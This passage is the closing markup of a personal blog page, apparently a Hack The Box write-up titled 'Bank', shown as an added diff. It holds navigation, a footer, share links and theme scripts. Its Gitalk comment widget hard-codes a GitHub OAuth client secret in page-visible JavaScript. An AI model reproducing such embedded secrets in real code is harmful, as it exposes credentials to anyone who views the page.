+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/03/29/Hackthebox%20-%20Granny/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Granny - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/&title=《Bank - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/&title=《Bank - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Bank - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/30/Hackthebox%20-%20Bank/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACNElEQVR42u3azW6DQAxF4bz/S1Opq0iU4VybRMWcWUVAgY+F6595vfDaftf77/e1v3J/fP2363tetmTIkHFbxrZce8bRkfQsf+76GhkyZDyHQYJsenb9Wvx69JlkyJAhAzyGB9k0ZZQhQ4aMNODWgunRNWlKKkOGjCcz0mKShEvyouug/JFaXIYMGTdk1AYD3/n98fmGDBky/j1ju3Sl5SsPzSfPlSFDxmgGaYSRApLAas27IBDLkCFjKIPfiI8E0sDKx6KHH1SGDBmjGWn7vlPWpi9HGnOo2pYhQ8bNGZ0yMg2UJOzygUExV5UhQ8ZtGXyjQ6cQrSWaKATLkCFjNIOka50QnKaGZKvH4f1lyJAxmtHptKebumqhXIYMGU9m9B95LTu9ZzFjlSFDxg0ZaduLf4J0bMC3evwRcGXIkDGUkSZnPBGsBej+9gsZMmTMY1zVJrv2nsWaW4YMGUMZPLFDQ8RS+VpLFg/nGzJkyBjHSLc1FOcM7U1g8QxWhgwZgxjp6DF9Rb61gj/38BoZMmQ8klELmlu4eAF88mlkyJDxAAZ5iXQwuQ7BnIGulyFDxmhGf7tDOv6Mm/54CCFDhox5jFoa12+TpR/iJODKkCFjNKMToclWif5/AxkyZMjghStv3/NkMb2/DBkyZKSBr99iS4vYk8JYhgwZMhoBlCeatbArQ4YMGWmzjLT+yajygjpbhgwZ4xidZn1nsxc/IkOGjCczas160m4jZ/vhXoYMGaMZP3r6qHYCMjkkAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
